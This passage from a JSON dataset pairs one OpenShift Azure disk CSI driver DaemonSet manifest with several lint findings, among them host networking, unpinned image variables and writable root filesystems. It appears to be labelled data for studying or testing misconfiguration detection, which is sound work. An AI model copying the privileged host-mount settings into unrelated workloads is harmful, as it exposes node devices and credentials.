- hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9222",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-driver\" is using an invalid container image, \"${DRIVER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9223",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-liveness-probe\" is using an invalid container image, \"${LIVENESS_PROBE_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9224",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-node-driver-registrar\" is using an invalid container image, \"${NODE_DRIVER_REGISTRAR_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9225",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-driver\" does not have a read-only root file system"
  },
  {
    "id": "9226",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "9227",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-node-driver-registrar\" does not have a read-only root file system"
  },
  {
    "id": "9228",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"azure-disk-csi-driver-node-sa\" not found"
  },
  {
    "id": "9229",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          